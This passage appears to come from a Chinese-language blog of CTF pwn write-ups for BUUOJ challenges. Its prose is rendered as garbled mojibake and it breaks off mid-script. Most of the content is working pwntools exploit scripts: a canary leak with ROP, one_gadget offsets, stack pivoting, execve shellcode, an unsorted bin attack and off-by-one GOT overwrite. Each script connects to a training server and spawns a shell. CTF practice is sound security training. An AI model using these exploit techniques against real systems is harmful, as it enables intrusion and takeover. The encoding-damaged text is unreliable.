class="hljs-selector-tag">p</span><span class="hljs-selector-class">.send</span>(pad)<br></code></pre></td></tr></table></figure><h3 id="others-babystack">others_babystack</h3><p><strong>å…³é”®è¯</strong>ï¼šæ³„éœ²canaryï¼Œrop</p><p><strong>æ€è·¯</strong>ï¼š</p><p>1.é¦–å…ˆå¡«å……æ•°ä¸ªaè‡³canaryï¼Œç„¶åæ¥å—ç›´åˆ°æœ€åä¸€ä¸ªaï¼Œå°±èƒ½æ¥æ”¶canaryäº†</p><p>2.ç„¶åå°±èƒ½æ ˆæº¢å‡ºï¼Œæ³„éœ²libc</p><p>3.ogå¼€shell</p><p><strong>æ³¨æ„ç‚¹</strong>ï¼š</p><p>ç”±äºcanaryçš„æœ€åä¸¤ä½æ˜¯0ï¼Œputsæ¥å—åˆ°\x00ç»“æŸï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨\nä»£æ›¿0ï¼Œå°±èƒ½å¸¦å‡ºcanaryï¼Œæ¥æ”¶çš„æ—¶å€™æ”¶7ä¸ªï¼Œåœ¨å³å¡«\x00</p><p>å°ç»“ï¼š</p><p>1.retæ˜¯åœ¨mainç»“æŸåï¼Œæ‰ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥è¦é€‰ä¸€ä¸‹3ï¼Œæ‰èƒ½æ‰“å°å‡ºgotåœ°å€</p><p>2.ä¸æ˜¯å¾ˆæ˜ç™½ä¸ºå•¥elf.sym[â€˜mainâ€™]ä¸é€šï¼Œè€Œ0x400908è¡Œï¼Ÿ</p><p>3.canaryåŸºæœ¬å½¢å¼ï¼Ÿ0x55dd1e56dddd500</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26665</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;a\n&#x27;</span>)<br>canary=u64(r.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br><span class="hljs-comment">#------------------------------------------</span><br>pop_rdi=<span class="hljs-number">0x400a93</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x400908</span>))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>got=u64(r.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br><span class="hljs-comment">#------------------------------------------</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">8</span>+p64(base+o_g_old[<span class="hljs-number">3</span>]))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easyoverflow">mrctf2020_easyoverflow</h3><p>æ£€æŸ¥æ˜¯æ£€æŸ¥v4æ˜¯å¦ä¸ä»–ç›¸ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27309</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-getshell-2">wustctf2020_getshell_2</h3><p>**å…³é”®è¯ï¼š**é™å®šå­—ç¬¦ï¼Œç”¨call_system</p><p>åªèƒ½å¤šå¡«12ä¸ªï¼Œç¨‹åºä¸­æœ‰ç°æˆçš„callå‡½æ•°å°±å¯ä»¥ä¸ç”¨è¿”å›å€¼äº†ï¼Œå› ä¸ºå®ƒä¼šè‡ªå·±æŠŠä¸‹ä¸€æ¡æŒ‡ä»¤ç»™å‹è¿›å»</p><p>æ‰€ä»¥ç”¨call_systemèƒ½çœç•¥è¿”å›å€¼</p><p>system(â€˜shâ€™)ä¹Ÿè¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29304</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./wustctf2020_getshell_2&#x27;</span>)<br>call_system=<span class="hljs-number">0x08048529</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(call_system)+p32(<span class="hljs-number">0x08048670</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-magicheap">hitcontraining_magicheap</h3><p>é¢˜å¤–è¯ï¼š1.çªç„¶å‘ç°ï¼Œvimç¼–è¾‘ä¸‹ï¼ŒæŒ‰ä½shiftå·¦å³ç§»åŠ¨ï¼Œä¼šç§»åŠ¨åˆ°å•è¯é¦–æœ«</p><p>2.æ‰å‘ç°ï¼Œè¿è¿œç«¯çš„æ—¶å€™ä¸èƒ½gdb.attachè°ƒè¯•</p><p><strong>å…³é”®è¯</strong>ï¼šunsortbinattackï¼Œå †æº¢å‡º</p><p>å‚è€ƒctf_wiki<a href="https://ctf-wiki.org/pwn/linux/glibc-heap/unsorted_bin_attack/#unsorted-bin-attack_1">Unsorted Bin Attack - CTF Wiki (ctf-wiki.org)</a></p><p>è¿™é¢˜åˆ©ç”¨åˆ°unsortbin attackï¼šå½“å°†ä¸€ä¸ª unsorted bin å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† <code>bck-&gt;fd</code> çš„ä½ç½®å†™å…¥æœ¬ Unsorted Bin çš„ä½ç½®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå®é™…æ˜¯æŠŠmagicæ”¹ä¸ºäº†unsortbinçš„åœ°å€&gt;1305</p><p><strong>æ€è·¯ï¼š</strong></p><p>1.ç”³è¯·ä¸‰ä¸ªå †ï¼Œindex0ï¼Œ1ï¼Œ2ï¼›</p><p>0å’Œ2å¤§å°éšæ„ï¼Œ1å¤§äº0x80</p><p>2.é‡Šæ”¾index1ï¼Œ1å°±ä¼šæ”¾åˆ°unsortbinä¸­ï¼Œåˆ©ç”¨å †æº¢å‡ºæ”¹index0ï¼Œæº¢å‡ºæŠŠindex1çš„bkæ”¹ä¸ºmagic-0x10</p><p>unsorted_chunks (av)æ˜¯é“¾è¡¨å¤´çš„ä½ç½®</p><p>unsorted_chunks (av)-&gt;bk = bck;   ==&gt;       bck=magic-0x10</p><p>bck-&gt;fd=unsorted_chunks (av)       ==&gt;       magic=unsotbinçš„åœ°å€</p><p>3.åœ¨é€‰4869ï¼Œå°±å¯ç»•è¿‡æ£€æŸ¥ï¼Œå¼€shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./magicheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28307</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#----------------------------------------------------</span><br>magic=<span class="hljs-number">0x6020A0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(magic-<span class="hljs-number">0x10</span>))<br>create(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4869&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-4">ciscn_2019_s_4</h3><p><strong>å…³é”®è¯</strong>ï¼šæ ˆè¿ç§»ï¼Œropï¼Œè°ƒè¯•</p><p><strong>æ€è·¯</strong>ï¼š</p><p>1.ç¬¬ä¸€ä¸ªreadæ³„éœ²ebpï¼Œå¾—çŸ¥ebpåœ°å€åŠæ ˆåœ°å€</p><p>2.è°ƒè¯•çš„åˆ°ebpä¸å¡«å……çš„åç§»</p><p>3.ç¬¬äºŒä¸ªreadå†™ropé“¾ï¼Œsystemçš„å‚æ•°è¦ä¸º/bin/sh\x00çš„åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29002</span>)<br><span class="hljs-comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_4&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>hack=<span class="hljs-number">0x804854b</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#gdb.attach(r)</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br><span class="hljs-comment">#------------------------------</span><br>leave_ret=<span class="hljs-number">0x080484b8</span><br>buf=ebp-<span class="hljs-number">0x38</span><br>r.send(<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(<span class="hljs-number">0</span>)+p32(buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x24</span>-<span class="hljs-number">0x14</span>)+p32(buf)+p32(leave_ret))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-start">pwnable_start</h3><p>**å…³é”®è¯ï¼š**æ±‡ç¼–ï¼Œæ³„éœ²ebpï¼Œè°ƒè¯•</p><p><strong>æ€è·¯ï¼š</strong></p><p>1.æŸ¥çœ‹æ±‡ç¼–ä»£ç å¾—çŸ¥é¢˜ç›®ä¿¡æ¯ï¼Œå‘ç°readå¤„å¯0x14åå¯æº¢å‡º</p><p>2.ä¾é å…¶ä¸­çš„writeï¼Œæ˜¯æ ¹æ®espæ¥ç¡®å®šæ‰“å°addrï¼Œé€‰æ‹©è¦†ç›–retåœ°å€ä¸ºwriteé‚£é‡Œï¼Œä¾¿èƒ½æ³„éœ²å‡ºæ ˆåœ°åœ°å€</p><p>3.gdbè°ƒè¯•ï¼ŒæŸ¥çœ‹æ ˆçš„åœ°å€ä¸æˆ‘ä»¬çš„payloadçš„å…³ç³»ï¼Œå…¶å®å°±æ˜¯esp+4çš„ä½ç½®</p><p>4.æ„é€ shellä»£ç ï¼Œæº¢å‡ºè·³è½¬è‡³shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29930</span>)<br><span class="hljs-comment">#r=process(&#x27;./start&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x68732f      </span><br><span class="hljs-string">push 0x6e69622f   </span><br><span class="hljs-string">mov ebx, esp</span><br><span class="hljs-string">xor edx, edx</span><br><span class="hljs-string">xor ecx, ecx</span><br><span class="hljs-string">mov al, 0xb       </span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;CTF:&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(<span class="hljs-number">0x08048087</span>))<br>stack_addr=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack_addr)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(stack_addr+<span class="hljs-number">0x14</span>)+sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-closed">wustctf2020_closed</h3><p><strong>int</strong> <strong>close</strong>(<strong>int</strong> fd) å‚æ•°è¯´æ˜ï¼š fdï¼šæ˜¯éœ€è¦å…³é—­çš„æ–‡ä»¶æè¿°ç¬¦</p><p>è¿™é“é¢˜closeï¼ˆ1ï¼‰ï¼Œcloseï¼ˆ2ï¼‰åå¼€shell</p><p>å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œé”™è¯¯è¾“å‡º</p><p>æŠŠstdouté‡å®šå‘ï¼šexec 1&gt;&amp;0</p><p>å°†æ–‡ä»¶æè¿°ç¬¦ 1 é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦ 0</p><h3 id="hitcontraining-heapcreator">hitcontraining_heapcreator</h3><p>**å…³é”®è¯ï¼š**off-by-oneï¼Œchunk extendï¼Œchunk overlap</p><p>**æ€è·¯ï¼š**è¿™é“é¢˜æœ‰ä¸ªç»“æ„ï¼Œç”³è¯·ä¸€ä¸ªå †ä¼šåœ¨bssæ®µä¸Šä¹Ÿæœ‰ä¸€ä¸ª0x20å¤§å°å †</p><p>é‡Œé¢å­˜äº†                                           |ç”³è¯·å †çš„size|æŒ‡å‘å †çš„æŒ‡é’ˆ|</p><p>æ ¹æ®è¿™ä¸ªæŒ‡é’ˆï¼Œå¯ä»¥å¤§ä½œæ–‡ç« ï¼ŒåŠ ä¹‹è¿˜æœ‰off-by-oneçš„æ¼æ´</p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p>1.åˆ©ç”¨off-by-oneæ‰©å¤§chunksizeï¼Œèµ·ç è¦åŒ…å«0x20å¤§å°çš„chunkï¼Œæ„Ÿè§‰æˆ‘ä¹Ÿæ²¡æ€ä¹ˆææ‡‚ï¼Œåæ­£å°±æ˜¯</p><p>è¦ç²¾å¿ƒæ„é€ ï¼Œæ¯”å¦‚è¿™é¢˜ï¼Œfreeåæ¥ç”³è¯·å›æ¥æ—¶ï¼Œ0x40èƒ½æ”¹0x20é‡Œé¢çš„æŒ‡é’ˆä¸size</p><p>2.æŒ‡é’ˆæŒ‡å‘çš„æ˜¯å †çš„åœ°å€ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¹æˆfree_gotçš„åœ°å€ï¼Œå†ï¼Œshowï¼Œå°±æ³„éœ²äº†libcåœ°å€</p><p>3.ç”±äºæŒ‡å‘çš„æ˜¯freeçš„gotçš„åœ°å€ï¼Œæˆ‘ä»¬ç»§ç»­å¯ä»¥editå¡«å…¥base+systemï¼Œå°±åŠ«æŒäº†freegotä¸ºsystem</p><p>4.å†åˆ©ç”¨å‰é¢æŸä¸ªchunkå¡«å……çš„/bin/sh\x00æ‰§è¡Œfreeï¼Œå°±æ‰§è¡Œsystemï¼ˆ/bin/sh\x00ï¼‰</p><p>**æ³¨æ„ç‚¹ï¼š**é™¤äº†åˆç†å¡«å……èŒƒå›´å†…ï¼Œä»¥å¤–çš„æœ€å¥½ä¸è¦ä¹±æ”¹ï¼Œå°±å¥½æ¯”0x20å¤§å°çš„é‡Œsizeå‚æ•°ï¼Œè¦æ”¹æ­£ç¡®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./heapcreator&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26706</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span 